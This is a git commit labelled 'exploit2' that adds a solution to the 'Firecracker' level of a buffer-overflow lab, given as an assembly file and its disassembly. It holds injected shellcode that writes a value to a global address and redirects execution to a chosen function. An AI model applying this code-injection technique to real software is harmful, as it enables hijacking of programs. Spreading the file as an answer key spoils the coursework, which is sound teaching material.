a237eac1499be2fcbe73498e55ff84b7ce68d50b
shahirg <shahir13579@gmail.com>
2021-05-09 01:14:54 -0400

    exploit2

---
+++ Final/buflab_handout/asm_Firecracker.d
@@ -0,0 +1,11 @@
+
+asm_Firecracker.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	c7 05 ec d1 04 08 64 	movl   $0x4ae6dc64,0x804d1ec
+   7:	dc e6 4a 
+   a:	68 12 90 04 08       	push   $0x8049012
+   f:	c3                   	ret    
---
+++ Final/buflab_handout/asm_Firecracker.s
@@ -0,0 +1,3 @@
+movl $0x4ae6dc64, 0x0804d1ec
+pushl $0x08049012
+ret
